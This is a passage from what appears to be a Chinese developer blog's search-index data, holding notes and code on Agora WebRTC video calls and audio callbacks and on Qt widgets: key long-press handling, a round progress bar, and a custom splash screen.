$(&quot;#local-player-name&quot;).text(`localTrack($&#123;options.uid&#125;)`); //create the mirror of local player $(&quot;#local-player-mirror-area&quot;).show(); var mirrorPlayer = document.getElementById(&quot;local-player-mirror-video-track&quot;); //get browser-native object MediaStreamTrack from WebRTC SDK const msTrack = localTracks.videoTrack.getMediaStreamTrack(); //generate browser-native object MediaStream with above video track const ms = new MediaStream([msTrack]) mirrorPlayer.srcObject = ms; mirrorPlayer.play(); // publish local tracks to channel await client.publish(Object.values(localTracks)); console.log(&quot;publish success&quot;); &#125;&#125;async function leave() &#123; for (trackName in localTracks) &#123; var track = localTracks[trackName]; if (track) &#123; track.stop(); track.close(); localTracks[trackName] = undefined; &#125; &#125; // remove remote users and player views remoteUsers = &#123;&#125;; $(&quot;#remote-playerlist&quot;).html(&quot;&quot;); // leave the channel await client.leave(); $(&quot;#local-player-name&quot;).text(&quot;&quot;); $(&quot;#host-join&quot;).attr(&quot;disabled&quot;, false); $(&quot;#audience-join&quot;).attr(&quot;disabled&quot;, false); $(&quot;#leave&quot;).attr(&quot;disabled&quot;, true); $(&quot;.video-mirror&quot;).hide(); console.log(&quot;client leaves channel success&quot;);&#125;async function subscribe(user, mediaType) &#123; const uid = user.uid; // subscribe to a remote user await client.subscribe(user, mediaType); console.log(&quot;subscribe success&quot;); if (mediaType === &#x27;video&#x27;) &#123; const player = $(` &lt;div id=&quot;player-wrapper-$&#123;uid&#125;&quot;&gt; &lt;p class=&quot;player-name&quot;&gt;remoteUser($&#123;uid&#125;)&lt;/p&gt; &lt;div id=&quot;player-$&#123;uid&#125;&quot; class=&quot;player&quot;&gt;&lt;/div&gt; &lt;p class=&quot;player-name&quot;&gt;Video Mirror&lt;/p&gt; &lt;div id=&quot;player-$&#123;uid&#125;-mirror-area&quot; class=&quot;player&quot; style=&quot;border: 2px dashed red ;&quot;&gt; &lt;div style=&quot;width: 100%; height: 100%; position: relative; overflow: hidden; background-color: black;&quot;&gt; &lt;video id=&quot;video_track-video-$&#123;uid&#125;-mirror&quot; class=&quot;agora_video_player&quot; playsinline=&quot;&quot; muted=&quot;&quot; style=&quot;width: 100%; height: 100%; position: absolute; left: 0px; top: 0px; object-fit: contain;&quot;&gt; &lt;/video&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; `); $(&quot;#remote-playerlist&quot;).append(player); user.videoTrack.play(`player-$&#123;uid&#125;`, &#123;fit:&quot;contain&quot;&#125;); //handling the mirror video $(`#player-$&#123;uid&#125;-mirror-area`).show(); var mirrorRemotePlayer = document.getElementById(`video_track-video-$&#123;uid&#125;-mirror`); //get browser-native object MediaStreamTrack from WebRTC SDK const msTrack = user.videoTrack.getMediaStreamTrack(); //generate browser-native object MediaStream with above video track const ms = new MediaStream([msTrack]) mirrorRemotePlayer.srcObject = ms; mirrorRemotePlayer.play(); &#125; if (mediaType === &#x27;audio&#x27;) &#123; user.audioTrack.play(); &#125;&#125;function handleUserPublished(user, mediaType) &#123; const id = user.uid; remoteUsers[id] = user; subscribe(user, mediaType);&#125;function handleUserUnpublished(user, mediaType) &#123; if (mediaType === &#x27;video&#x27;) &#123; const id = user.uid; delete remoteUsers[id]; $(`#player-wrapper-$&#123;id&#125;`).remove(); &#125;&#125; 改动点新建一个配置页面，由用户进入房间时填写 AppId,token,channel等 js 代码改动点： 1234options.appid = $(&quot;#appid&quot;).val();options.token = $(&quot;#token&quot;).val();options.channel = $(&quot;#channel&quot;).val();options.uid = Number($(&quot;#uid&quot;).val());","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"TypeScript","slug":"B-Code/TypeScript","permalink":"http://example.com/categories/B-Code/TypeScript/"}]},{"title":"TypeScript","date":"2023-10-27T01:24:02.344Z","path":"B_Code/TypeScript/selfRecord/","text":"[Toc] 快速上手 安装 1npm add @netless/fastboard @netless/window-manager white-web-sdk 创建实时音频采集音视频相关1. 获取摄像头列表 调用 getMicrophones 获取可用的摄像头列表 getMicrophones 方法会通过 Promise 异步返回一个 MediaDeviceInfo 对象的数组。MediaDeviceInfo 对象复用了 WebRTC API 中的 MediaDeviceInfo 对象。因为是异步方法，你可以使用 then&#x2F;catch (ES6) 或 async&#x2F;await (ES7) 获取返回值。 123456789// 获取可用的麦克风设备列表。// 调用时，如果浏览器还没有获得麦克风访问权限，会在界面上提示你是否允许浏览器访问麦克风。AgoraRTC.getMicrophones().then((deviceInfoArray) =&gt; &#123; /* 返回 MediaDeviceInfo 数组对象之后的操作*/&#125;).catch((e) =&gt; &#123; console.log(&quot;Failed to get microphones!&quot;, e);&#125;); 2. 获取摄像头设备信息在此教程中，我们在 HTML 中创建一个下拉菜单来供用户选择使用的摄像头设备。在用户界面上使用 label 属性显示设备信息。deviceId 属性用于保存设备 ID，用于后续的摄像头访问。 label，即设备标签，返回一个 DOMString，代表描述对应设备的标签。如果浏览器没有获取设备权限，则返回 &quot;&quot;。 deviceId，即设备 ID，返回一个 DOMString，代表对应设备。设备 ID 对于应用是唯一的，只要浏览器的 cookie 没有被清除，即使你开启了新的浏览器会话（session），设备 ID 也会保持不变。如果你清除了浏览器 cookie，则设备 ID 会重置。同理，如果你开启了浏览器隐私模式，对于同一个设备，每个浏览器会话的设备 ID 都是不同的。因此，建议每次对设备进行操作时重新获取设备 ID。 HTML 123456789&lt;h1&gt;通过麦克风采集并在本地渲染音频&lt;/h1&gt;&lt;form&gt;&lt;b&gt; 选择你要使用的麦克风 &lt;/b&gt;&lt;select id = &quot;microphoneList&quot; onchange = &quot;getDeviceId()&quot; &gt;&lt;option&gt; ---选择麦克风--- &lt;/option&gt;&lt;/select&gt;&lt;/form&gt;&lt;p&gt;你选择设备的 deviceId 是：&lt;/p&gt;&lt;p id=&quot;deviceId&quot;&gt;&lt;/p&gt; JavaScript 1234567891011121314151617181920212223// 定义设备 ID 与标签的映射let dict = &#123;&#125;;// 获取摄像头列表AgoraRTC.getMicrophones().then((deviceInfoArray) =&gt; &#123; for (let deviceInfo of deviceInfoArray) &#123; let option = document.createElement(&quot;option&quot;); document.getElementById(&quot;microphoneList&quot;).appendChild(option); option.innerHTML = deviceInfo.label; dict[deviceInfo.label] = deviceInfo.deviceId; &#125;&#125;).catch((e) =&gt; &#123; console.log(&quot;Failed to get microphones!&quot;, e);&#125;);// 根据下拉菜单选择的设备标签，显示相应的设备 IDfunction getDeviceId() &#123; let microphoneList = document.getElementById(&quot;microphoneList&quot;); let deviceLabel = microphoneList.options[microphoneList.selectedIndex].text; document.getElementById(&quot;deviceId&quot;).innerHTML = dict[deviceLabel];&#125; 3. 创建麦克风音频轨道并渲染调用 createMicrophoneAudioTrack 创建麦克风音频轨道并调用成员方法 play 通过系统默认扬声器对视频进行渲染。这里轨道的概念和 WebRTC 中的 track 相似。一个轨道代表一路特定的视频源或音频源。声网 SDK 将不同来源的音视频轨道进行抽象，定义了摄像头视频轨道、屏幕采集视频轨道及自定义源视频轨道等。 这个步骤只是为了演示麦克风音频轨道的渲染。实际开发通话应用时，本地不需要播放本地麦克风采集的音频。 HTML 123456789&lt;h1&gt;通过麦克风采集并在本地渲染音频&lt;/h1&gt;&lt;form&gt;&lt;b&gt; 选择你要使用的麦克风 &lt;/b&gt;&lt;select id=&quot;microphoneList&quot; onchange=&quot;getDeviceId()&quot;&gt; &lt;option&gt; ---选择麦克风--- &lt;/option&gt;&lt;/select&gt;&lt;/form&gt;&lt;p&gt;你选择设备的 deviceId 是：&lt;/p&gt;&lt;p id=&quot;deviceId&quot;&gt;&lt;/p&gt; CSS 12body &#123;font-family: system-ui;background: #f06d06;color: white;text-align: center;&#125;div &#123;height: 200px;width: 50%;&#125; JavaScript 12345678910111213141516171819202122232425262728293031323334353637383940// 全局变量let dict = &#123;&#125;; // 使用 dict 映射设备标签和设备 IDlet selectedDeviceId = &quot;&quot;; // 下选框选择的设备对应的 IDlet microphoneAudioTrack = null; // 麦克风音频轨道对象// 获取本地麦克风列表AgoraRTC.getMicrophones().then((deviceInfoArray) =&gt; &#123; for (let deviceInfo of deviceInfoArray) &#123; let option = document.createElement(&quot;option&quot;); document.getElementById(&quot;microphoneList&quot;).appendChild(option); option.innerHTML = deviceInfo.label; dict[deviceInfo.label] = deviceInfo.deviceId; &#125;&#125;).catch((e) =&gt; &#123; console.log(&quot;Failed to get microphones!&quot;, e);&#125;);// 创建麦克风音频轨道AgoraRTC.createMicrophoneAudioTrack().then((microphoneAudioTrack) =&gt; &#123; // 渲染音频。SDK 使用系统默认的扬声器播放声音。 microphoneAudioTrack.play();&#125;).catch((e) =&gt; &#123; console.log(&quot;Failed to play audio!&quot;, e);&#125;);// 根据选择的设备标签，返回对应的设备 ID 并传给麦克风音频轨道function getDeviceId() &#123;let microphoneList = document.getElementById(&quot;microphoneList&quot;);let deviceLabel = microphoneList.options[microphoneList.selectedIndex].text;selectedDeviceId = dict[deviceLabel];document.getElementById(&quot;deviceId&quot;).innerHTML = selectedDeviceId;if (microphoneAudioTrack != null) &#123; microphoneAudioTrack.setDevice(selectedDeviceId);&#125;&#125; #音频回调 setAudioFrameCallback setAudioFrameCallback(audioFrameCallback: null | function, frameSize?: undefined | number): void 设置原始音频数据（PCM）回调。 设置成功后，SDK 会不断地将远端音频轨道的音频帧以 AudioBuffer 的形式通过回调返回。 你可以通过 frameSize 来设置每次回调中音频帧的大小。该设置也会影响回调的间隔，frameSize 越大，每次回调的音频数据越多，回调间隔越长。 1234567891011track.setAudioFrameCallback((buffer) =&gt; &#123; for (let channel = 0; channel &lt; buffer.numberOfChannels; channel += 1) &#123; // Float32Array with PCM data const currentChannelData = buffer.getChannelData(channel); console.log(&quot;PCM data in channel&quot;, channel, currentChannelData); &#125;&#125;, 2048);// ....// Stop getting the raw audio datatrack.setAudioFrameCallback(null); 音频回调解码AudioBuffer - Web API 接口参考 | MDN AudioBuffer 接口表示存在内存里的一段短小的音频资源，利用AudioContext.decodeAudioData()方法从一个音频文件构建，或者利用 AudioContext.createBuffer()从原始数据构建。把音频放入 AudioBuffer 后，可以传入到一个 AudioBufferSourceNode进行播放。 这些类型对象被设计来控制小音频片段，往往短于 45 秒。对于更长的声音，通过 MediaElementAudioSourceNode来实现更为合适。缓存区（buffer）包含以下数据：不间断的 IEEE754 32 位线性 PCM，从-1 到 1 的范围额定，就是说，32 位的浮点缓存区的每个样本在-1.0 到 1.0 之间。如果AudioBuffer有不同的频道，他们通常被保存在独立的缓存区。 1) 属性 AudioBuffer.sampleRate 只读 存储在缓存区的 PCM 数据的采样率：浮点数，单位为 sample&#x2F;s。 AudioBuffer.length 只读 返回存储在缓存区的 PCM 数据的采样帧数：整形。 AudioBuffer.duration 只读 返回存储在缓存区的 PCM 数据的时长：双精度型（单位为秒）。 AudioBuffer.numberOfChannels 只读 返回存储在缓存区的 PCM 数据的通道数：整形。 2) 方法 AudioBuffer.getChannelData() 返回一个 Float32Array，包含了带有频道的 PCM 数据，由频道参数定义（有 0 代表第一个频道） AudioBuffer.copyFromChannel() 从 AudioBuffer 的指定频道复制到数组终端。 AudioBuffer.copyToChannel() (en-US) 复制样品到原数组的 AudioBuffer 的指定频道 3) 例子以下的例子展示了如何构建一个 AudioBuffer 以及随机用白噪音填充。你可以在 audio-buffer demo库发现完整的源代码；一个running live 的版本也可获得。 123456789101112131415161718192021222324252627282930313233343536// Stereovar channels = 2;// Create an empty two second stereo buffer at the// sample rate of the AudioContextvar frameCount = audioCtx.sampleRate * 2.0;var myArrayBuffer = audioCtx.createBuffer(channels, frameCount, audioCtx.sampleRate);button.onclick = function() &#123; // Fill the buffer with white noise; // just random values between -1.0 and 1.0 for (var channel = 0; channel &lt; channels; channel++) &#123; // This gives us the actual array that contains the data var nowBuffering = myArrayBuffer.getChannelData(channel); for (var i = 0; i &lt; frameCount; i++) &#123; // Math.random() is in [0; 1.0] // audio needs to be in [-1.0; 1.0] nowBuffering[i] = Math.random() * 2 - 1; &#125; &#125; // Get an AudioBufferSourceNode. // This is the AudioNode to use when we want to play an AudioBuffer var source = audioCtx.createBufferSource(); // set the buffer in the AudioBufferSourceNode source.buffer = myArrayBuffer; // connect the AudioBufferSourceNode to the // destination so we can hear the sound source.connect(audioCtx.destination); // start the source playing source.start();&#125; 4) 规格参数 Specification Web Audio API # AudioBuffer 录音对象属性Agora Web API Reference - 语音通话 - 文档中心 - 声网Agora 音频编码AudioEncoderConfigurationPresetAudioEncoderConfigurationPreset: keyof typeof AUDIO_ENCODER_CONFIG_SETTINGS SDK 预设的 [AudioEncoderConfiguration](https://docs.agora.io/cn/Voice/API Reference&#x2F;web_ng&#x2F;interfaces&#x2F;audioencoderconfiguration.html) 配置。 你可以在以下方法中传入预设值来控制本地音频的编码配置： [AgoraRTC.createCustomAudioTrack](https://docs.agora.io/cn/Voice/API Reference&#x2F;web_ng&#x2F;interfaces&#x2F;iagorartc.html#createcustomaudiotrack) [AgoraRTC.createMicrophoneAudioTrack](https://docs.agora.io/cn/Voice/API Reference&#x2F;web_ng&#x2F;interfaces&#x2F;iagorartc.html#createmicrophoneaudiotrack) [AgoraRTC.createBufferSourceAudioTrack](https://docs.agora.io/cn/Voice/API Reference&#x2F;web_ng&#x2F;interfaces&#x2F;iagorartc.html#createbuffersourceaudiotrack) 下表列出了 SDK 所有内置的音频属性配置，SDK 默认使用 &quot;music_standard&quot;。 音频属性 配置 &quot;speech_low_quality&quot; 16 kHz 采样率，单声道，编码码率约 24 Kbps &quot;speech_standard&quot; 32 kHz 采样率，单声道，编码码率约 24 Kbps &quot;music_standard&quot; 48 kHz 采样率，单声道，编码码率约 40 Kbps &quot;standard_stereo&quot; 48 kHz 采样率，双声道，编码码率约 64 Kbps &quot;high_quality&quot; 48 kHz 采样率，单声道， 编码码率约 128 Kbps &quot;high_quality_stereo&quot; 48 kHz 采样率，双声道，编码码率约 192 Kbps 本地音频轨道Agora Web API Reference - 语音通话 - 文档中心 - 声网Agora 对接基于声网 Web SDK 实现视频通话场景 - 专栏 - 声网 Agora RTC 开发者社区","tags":[{"name":"脚本","slug":"脚本","permalink":"http://example.com/tags/%E8%84%9A%E6%9C%AC/"},{"name":"TypeScript","slug":"TypeScript","permalink":"http://example.com/tags/TypeScript/"},{"name":"fastboard","slug":"fastboard","permalink":"http://example.com/tags/fastboard/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"TypeScript","slug":"B-Code/TypeScript","permalink":"http://example.com/categories/B-Code/TypeScript/"}]},{"title":"Qt 键盘长按","date":"2023-10-27T01:24:02.337Z","path":"B_Code/Qt/鼠标键盘/Qt键盘长按/","text":"KeyPressEvent 事件键盘事件是重写 keypressevent 函数，详见代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445//keyLongPress.cpp #include &quot;keyLongPress.h&quot;#include &quot;ui_keyLongPress.h&quot; KeyLongPress::KeyLongPress(QWidget *parent) : QWidget(parent), ui(new Ui::KeyLongPress)&#123; ui-&gt;setupUi(this);&#125; KeyLongPress::~KeyLongPress()&#123; delete ui;&#125; //QMouseEvent没有isAutoRepeat()方法...无语了，//这样有些操作就不方便实现了，//比如长按鼠标多少秒呼出某个(登录)窗口啥的。 //! [按键按下事件-Begin]void KeyLongPress::keyPressEvent(QKeyEvent *event)&#123; if(event-&gt;isAutoRepeat())&#123; qDebug() &lt;&lt; &quot;按键长按中...&quot;; &#125; else&#123; qDebug() &lt;&lt; &quot;按键按下&quot;; &#125;&#125;//! [按键按下事件-End] //! [按键释放事件-Begin]void KeyLongPress::keyReleaseEvent(QKeyEvent *event)&#123; if(event-&gt;isAutoRepeat())&#123; qDebug() &lt;&lt; &quot;按键不断释放...&quot;; &#125; else&#123; qDebug() &lt;&lt; &quot;按键释放&quot;; &#125;&#125;//! [按键释放事件-End] 运行之后，测试效果：你Click看下输出：是只有1次Press和1次Release的， 长按看下输出：是Press和Release一直在不停的输出的。 示意图：","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"键盘","slug":"键盘","permalink":"http://example.com/tags/%E9%94%AE%E7%9B%98/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"鼠标键盘","slug":"B-Code/Qt/鼠标键盘","permalink":"http://example.com/categories/B-Code/Qt/%E9%BC%A0%E6%A0%87%E9%94%AE%E7%9B%98/"}]},{"title":"Qt 圆形进度条","date":"2023-10-27T01:24:02.327Z","path":"B_Code/Qt/动画/Qt圆形进度条/","text":"[toc] 实现效果 h123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#ifndef _QROUNDPROGRESSBAR_H_#define _QROUNDPROGRESSBAR_H_ #include &lt;QWidget&gt; class QRoundProgressBar : public QWidget&#123; Q_OBJECTpublic: //进度条形状 enum BarStyle &#123; //圆环状 StyleDonut = 0, //圆饼状 StylePie, //圆线状 StyleLine &#125;; public: QRoundProgressBar(QWidget *parent , BarStyle style = StyleLine); ~QRoundProgressBar(); public: //设置扫描弧度起始角度 void setStartAngle(double position); //设置轮廓画笔的宽度 void setOutlinePenWidth(double penWidth); //设置画笔宽度 void setDataPenWidth(double penWidth); //设置进度条精度 88.88%,几位小数 void setDecimals(int count); //设置进度条风格 void setBarStyle(BarStyle style); //设置范围 void setRange(double min, double max); //设置当前值 void setValue(int val); //设置当前值 void setValue(double val); //设置最小值 void setMinimum(double min); //设置最大值 void setMaximum(double max); protected: void paintEvent(QPaintEvent *event); //画基础图形 void drawBase(QPainter&amp; p, const QRectF&amp; baseRect, const QRectF &amp;innerRect); //根据值画出进度条 void drawValue(QPainter&amp; p, const QRectF&amp; baseRect, double value, double arcLength, const QRectF &amp; innerRect , double innerDiameter); //画中心文字 void drawText(QPainter&amp; p, const QRectF&amp; innerRect, double value); private: double m_min; //最小值 double m_max; //最大值 double m_value; //当前值 BarStyle m_barStyle; //进度条风格 int m_decimals; //进度条精度 double m_startAngel; //扫描弧度起始角度 double m_outlinePenWidth; //轮廓画笔的宽度 double m_dataPenWidth; //画笔宽度&#125;; #endif // _QROUNDPROGRESSBAR_H_ cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285#include &quot;QRoundProgressBar.h&quot;#include &lt;QPainter&gt;#include &lt;QPointF&gt;#include &lt;QtMath&gt; QRoundProgressBar::QRoundProgressBar(QWidget *parent , BarStyle style) : QWidget(parent) , m_min(0) , m_max(100) , m_value(0) , m_startAngel(90) , m_barStyle(style) , m_outlinePenWidth(0) , m_dataPenWidth(0) , m_decimals(0)&#123;&#125; QRoundProgressBar::~QRoundProgressBar()&#123;&#125; void QRoundProgressBar::setStartAngle(double angle)&#123; if (angle != m_startAngel) &#123; m_startAngel = angle; update(); &#125;&#125; void QRoundProgressBar::setOutlinePenWidth(double penWidth)&#123; if (penWidth != m_outlinePenWidth) &#123; m_outlinePenWidth = penWidth; update(); &#125;&#125; void QRoundProgressBar::setDataPenWidth(double penWidth)&#123; if (penWidth != m_dataPenWidth) &#123; m_dataPenWidth = penWidth; update(); &#125;&#125; void QRoundProgressBar::setDecimals(int count)&#123; if (count &gt;= 0 &amp;&amp; count != m_decimals) &#123; m_decimals = count; update(); &#125;&#125; void QRoundProgressBar::setBarStyle(BarStyle style)&#123; if (style != m_barStyle) &#123; m_barStyle = style; update(); &#125;&#125; void QRoundProgressBar::setRange(double min, double max)&#123; m_min = min; m_max = max; if (m_max &lt; m_min) &#123; qSwap(m_max, m_min); &#125; if (m_value &lt; m_min) &#123; m_value = m_min; &#125; else if (m_value &gt; m_max) &#123; m_value = m_max; &#125; update();&#125; void QRoundProgressBar::setValue(double val)&#123; if (m_value != val) &#123; if (val &lt; m_min) &#123; m_value = m_min; &#125; else if (val &gt; m_max) &#123; m_value = m_max; &#125; else &#123; m_value = val; &#125; update(); &#125;&#125; void QRoundProgressBar::setValue(int val)&#123; setValue(double(val));&#125; void QRoundProgressBar::setMinimum(double min)&#123; setRange(min, m_max);&#125; void QRoundProgressBar::setMaximum(double max)&#123; setRange(m_min, max);&#125; void QRoundProgressBar::paintEvent(QPaintEvent* /*event*/)&#123; //外圈直径 double outerDiameter = this-&gt;width(); //外圈矩形 QRectF baseRect(0, 0, outerDiameter, outerDiameter); QPainter p(this); p.setRenderHints(QPainter::Antialiasing | QPainter::SmoothPixmapTransform); //画背景矩形填充白色 p.fillRect(baseRect, QBrush(QColor(&quot;#FFFFFF&quot;))); //内圆直径 double innerDiameter = width() * 0.9; //内圈矩形 QRectF innerRect; //计算内圈矩形 if (m_barStyle == StyleLine) &#123; innerDiameter = outerDiameter - m_outlinePenWidth; &#125; else if(m_barStyle == StyleDonut) &#123; innerDiameter = outerDiameter * 0.9; &#125; double delta = (outerDiameter - innerDiameter) / 2; innerRect = QRectF(delta, delta, innerDiameter, innerDiameter); //画基础图形 drawBase(p, baseRect, innerRect); //计算当前步长比例 double arcStep = 360.0 / (m_max - m_min) * m_value; //根据值画出进度条 drawValue(p, baseRect, m_value, arcStep, innerRect, innerDiameter); //画文字 drawText(p, baseRect, m_value); p.end();&#125; void QRoundProgressBar::drawBase(QPainter &amp;p, const QRectF &amp;baseRect, const QRectF &amp;innerRect)&#123; switch (m_barStyle) &#123; case StyleDonut: &#123; QPainterPath dataPath; dataPath.setFillRule(Qt::OddEvenFill); dataPath.moveTo(baseRect.center()); dataPath.addEllipse(innerRect); QPen pen; pen.setColor(QColor(&quot;#DEE3E7&quot;)); pen.setWidth(10); p.setPen(pen); p.setBrush(QBrush(QColor(&quot;#FFFFFF&quot;))); p.drawPath(dataPath); break; &#125; case StylePie: &#123; p.setPen(QPen(QColor(&quot;#FFFFFF&quot;), m_outlinePenWidth)); p.setBrush(QBrush(QColor(&quot;#DEE3E7&quot;))); p.drawEllipse(baseRect); break; &#125; case StyleLine: &#123; p.setPen(QPen(QColor(&quot;#FFFFFF&quot;), m_outlinePenWidth)); p.setBrush(Qt::NoBrush); p.drawEllipse(baseRect.adjusted(m_outlinePenWidth / 2, m_outlinePenWidth / 2, -m_outlinePenWidth / 2, -m_outlinePenWidth / 2)); break; &#125; default: &#123; break; &#125; &#125;&#125; void QRoundProgressBar::drawValue(QPainter &amp;p, const QRectF &amp;baseRect , double value, double arcLength , const QRectF &amp; innerRect, double innerDiameter)&#123; if (value == m_min) &#123; return; &#125; if (m_barStyle == StyleLine) &#123; p.setPen(QColor(&quot;#2F8DED&quot;)); p.setBrush(Qt::NoBrush); p.drawArc(baseRect,m_startAngel * 16, -arcLength * 16); &#125; else if (m_barStyle == StyleDonut) &#123; QPen pen; pen.setColor(QColor(&quot;#2F8DED&quot;)); pen.setWidth(8); pen.setCapStyle(Qt::RoundCap); p.setPen(pen); p.drawArc(innerRect, m_startAngel*16 , -16*arcLength); &#125; else &#123; //获取中心点坐标 QPointF centerPoint = baseRect.center(); QPainterPath dataPath; dataPath.setFillRule(Qt::WindingFill); dataPath.moveTo(centerPoint); //逆时针画弧长 dataPath.arcTo(baseRect, m_startAngel, -arcLength); if (m_barStyle == StylePie) &#123; dataPath.lineTo(centerPoint); p.setPen(QPen(QColor(&quot;#2F8DED&quot;), m_dataPenWidth)); &#125; p.setBrush(QBrush(QColor(&quot;#2F8DED&quot;))); p.drawPath(dataPath); &#125; &#125; void QRoundProgressBar::drawText(QPainter &amp;p, const QRectF &amp;rect, double value)&#123; QString textToDraw = &quot;%&quot;; double percent = (value - m_min) / (m_max - m_min) * 100.0; textToDraw = QString::number(percent, &#x27;f&#x27;, m_decimals) + textToDraw; QFont f; f.setFamily(&quot;微软雅黑&quot;); f.setPixelSize(20); p.setFont(f); p.setPen(QColor(&quot;#606266&quot;)); p.drawText(rect, Qt::AlignCenter, textToDraw);&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"进度条","slug":"进度条","permalink":"http://example.com/tags/%E8%BF%9B%E5%BA%A6%E6%9D%A1/"},{"name":"圆","slug":"圆","permalink":"http://example.com/tags/%E5%9C%86/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"动画","slug":"B-Code/Qt/动画","permalink":"http://example.com/categories/B-Code/Qt/%E5%8A%A8%E7%94%BB/"}]},{"title":"Qt 启动动画","date":"2023-10-27T01:24:02.326Z","path":"B_Code/Qt/动画/Qt启动动画/","text":"[toc] QSplashScreen设置图片 Qt内置了用于程序启动的动画直接使用QSplashScreen即可。 12345678910111213141516171819202122QPixmap pixmap(&quot;:load.gif&quot;); //读取图片QSplashScreen splash(pixmap); //splash.setWindowOpacity(0.8); // 设置窗口透明度splash.show();splash.showMessage(&quot;程序正在加载......&quot;, Qt::AlignCenter, Qt::red); //显示文字// 可选项#ifdeg DEBUGQDateTime time = QDateTime::currentDateTime();QDateTime currentTime = QDateTime::currentDateTime(); //记录当前时间while (time.secsTo(currentTime) &lt;= 5) // 5为需要延时的秒数&#123; currentTime = QDateTime::currentDateTime(); a.processEvents();&#125;;#endifwidget w;w.show();splash.finish(&amp;w); //在主体对象初始化完成后结束启动动画 以上代码放在程序的入口main函数中即可。 widget就是我们需要启动的程序。 自定义启动动画 自定义启动动画的方式网上有几种重写 QSplashScreen 的。笔者也尝试使用了一下，发现并不好用，于是按照一开始的方案，准备用一个 widget 去写启动动画。 参考 QSplashScreen 的方式，还是使用 finish(QWidget *mainWin) 的接口去作为窗体关闭的入口。 finish(Qwidget *mainWin)关于 finished(QWidget *mainWin) 直接把 QSplashScreen 的源码搬过来即可。 源码一般在你使用的版本的 src 文件夹下： $&#123;install dir&#125;\\5.9.9\\Src\\qtbase\\src\\widgets\\widgets QSplashScreen 源码中的 finish() 如下所示： 1234567891011121314/*! Makes the splash screen wait until the widget \\a mainWin is displayed before calling close() on itself.*/// 这个接口我们需要复制到自定义的启动动画窗体中。void QSplashScreen::finish(QWidget *mainWin)&#123; if (mainWin) &#123; if (!mainWin-&gt;windowHandle()) mainWin-&gt;createWinId(); waitForWindowExposed(mainWin-&gt;windowHandle()); &#125; close();&#125; 上述代码，唯一的问题在于 waitForWindowExposed 这个函数我没有找到实现，也没有仔细找，但是在 Qt 的 testlib 库中有一个类似的接口 QTest::qwaitForWindowExposed() 两个接口的作用应该是一致的。上述代码中 waitForWindowExposed(mainWin-&gt;windowHandle()); 经笔者测试哈（不一定准确），即使去掉也不会影响 finish() 接口的作用。^2022年7月27日08:39:40^ 去掉还是会有影响的，相当于判断窗口的逻辑没了。关于 waitForWindowExposed() 在 Qt源码中的实现，笔者在调试程序的时候发现去掉这行代码，怎么看启动动画和运行的程序之间的衔接都不太合理，遂决定找一下这个 waitForWindowExposed() 的源码，这一找，真的是远在天边，近在眼前。函数的实现就在 qsplashscreen.cpp 中。这里贴一下其源码。 1234567891011121314151617181920212223// A copy of Qt Test&#x27;s qWaitForWindowExposed() and qSleep().inline static bool waitForWindowExposed(QWindow *window, int timeout = 1000)&#123; enum &#123; TimeOutMs = 10 &#125;; QElapsedTimer timer; timer.start(); while (!window-&gt;isExposed()) &#123; const int remaining = timeout - int(timer.elapsed()); if (remaining &lt;= 0) break; QCoreApplication::processEvents(QEventLoop::AllEvents, remaining); QCoreApplication::sendPostedEvents(0, QEvent::DeferredDelete);#if defined(Q_OS_WINRT) WaitForSingleObjectEx(GetCurrentThread(), TimeOutMs, false);#elif defined(Q_OS_WIN) Sleep(uint(TimeOutMs));#else struct timespec ts = &#123; TimeOutMs / 1000, (TimeOutMs % 1000) * 1000 * 1000 &#125;; nanosleep(&amp;ts, NULL);#endif &#125; return window-&gt;isExposed();&#125; 如果要使用你源码中的实现，则需要引入两个头问题。 12#include &lt;QElapsedTimer&gt;#include &lt;QtGui/QWindow&gt; *设置窗体设置窗体的逻辑也比较简单，就是创建一个widget、Dialog专门用来实现启动动画的逻辑。如下所示为Qt程序的入口函数： 123456789101112int main(int argc, char *argv[])&#123; QApplication a(argc, argv); Dialog d; // 启动动画的窗台 d.show(); Widget w; w.show(); d.finish(&amp;w); // 复制的 QSplashScreen 中的 finished() return a.exec();&#125; 其中的 Dialog d 就是我们创建的一个自定义的启动动画窗口，至于窗口内要实现什么，依据你个人的业务和需求去实现即可。 问题1 上文中的 Dialog 还没有主界面就展示了，或者 Dialog 展示了但是没有画面。 关于这个问题，我认为是主界面的刷新太快了（大家可以调试代码去观察一下现象），也就是 finish 相当于是瞬间调用了。导致 Dialog没有展示和来得及刷新 。这个问题网友也给出了方案，让 main 做一些别的操作延时一下。目前笔者用过的最好的不是在 main 中 sleep 。而是执行以下 processEvent() 具体的代码就是在 Widget::show() 之前调用，如下所示： 12345678// 这里的时间只是为了做一个判断，只调用一下 a.processEvents(); 应该也是可以的QDateTime time = QDateTime::currentDateTime();QDateTime currentTime = QDateTime::currentDateTime(); //记录当前时间while (time.secsTo(currentTime) &lt;= 5) //5为需要延时的秒数&#123; currentTime = QDateTime::currentDateTime(); a.processEvents();&#125;; 问题2 Dialog 结束的时候界面关闭和主界面的展示会中断一下，强迫症难以接受这种突然闪现怎么办？ 还是会到 finish() 。 在 closed() 的位置 sleep()，让关闭的窗口稍微等一等，等主界面展示出来之后再关闭。1s 